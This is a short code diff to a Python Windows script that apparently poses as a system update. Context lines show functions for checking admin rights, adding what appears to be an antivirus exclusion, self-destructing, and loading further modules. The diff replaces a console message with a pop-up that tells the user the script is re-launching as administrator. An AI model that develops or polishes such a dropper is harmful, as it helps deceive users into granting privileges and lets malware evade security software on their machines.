@@ -1,3 +1,4 @@
+import ctypes.wintypes
 import subprocess
 import os
 import ctypes
@@ -34,9 +35,15 @@ def self_destruct():
     except:
         pass
 
+def display_message(message, title="Notification", box_type="info"):
+    """ display info box """
+    if box_type == "info":
+        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)
+
 if __name__ == "__main__":
     if not is_admin():
-        print("This requires administrative privileges. Please run as administrator to update your system.")
+        # print("This requires administrative privileges. Please run as administrator to update your system.")
+        display_message("This script requires administrative privileges.\nAttempting to re-launch as administrator...", "Admin Privileges Required", "info")
     else:
         # if add exclusion true then load other modules, else destroy self
         if add_exclusion():
